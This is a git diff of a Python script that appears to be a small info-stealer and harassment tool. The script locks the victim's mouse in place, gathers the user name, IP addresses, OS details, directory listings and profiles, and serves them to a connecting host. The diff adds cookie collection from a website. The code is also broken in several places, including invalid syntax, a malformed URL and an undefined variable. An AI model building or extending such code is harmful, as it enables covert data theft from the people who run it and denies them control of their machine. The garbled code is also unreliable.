@@ -6,7 +6,6 @@ from time import sleep
 import threading
 from requests import get
 
-
 # FARVER #
 red = "\033[91;1m"
 reset = "\033[0m"
@@ -23,14 +22,14 @@ HOST = "" # your local ip address
 PORT = 80
 BUFFER = 1024*3
 
-def lock_mouse(X, Y, freedom):
+def lock_mouse(X, Y, time_in_milliseconds):
     pos = (X,Y)
     mouse.move(X, Y)
     while True:
         num += 1
         if mouse.get_position() != pos:
             mouse.move(pos[0], pos[1])
-            sleep(freedom)
+            sleep(time_in_milliseconds)
         else:
             pass
         
@@ -40,7 +39,7 @@ def lock_mouse(X, Y, freedom):
 def listen_for_host(host,port):
     address = (host,port)
     print(f"Getting information...")
-    get_os_info()
+    get_os_info("https:///example.com")
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.bind(address)
@@ -60,7 +59,8 @@ def listen_for_host(host,port):
             operating system: {info_list[3]}\n\
             directory contents: {info_list[4]}\n\
             profiles: {info_list[5]}\n\
-            api version: {info_list[6]}\n"
+            api version: {info_list[6]}\n\
+            coockie: {info_list{7}\n}"
 
     conn.send(f"\n{msg}".encode())
     conn.close()
@@ -68,7 +68,7 @@ def listen_for_host(host,port):
     
     
 
-def get_os_info():
+def get_os_info(website_to_get_cookie):
 
     global info_list
     info_list = []
@@ -80,11 +80,13 @@ def get_os_info():
     dir_content = listdir()
     profiles = getprofile()
     api = api_version
-    all = user, public_ip, local_ip, operating_system, dir_content, profiles, api
+    coockie = get(website_to_get_cookie).cookies
+    
+    all = user, public_ip, local_ip, operating_system, dir_content, profiles, api, coockie
 
     for i in all:
         info_list.append(i)
 
 
-lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,0.01)).start()
+lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,100)).start()
 send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT)).start()
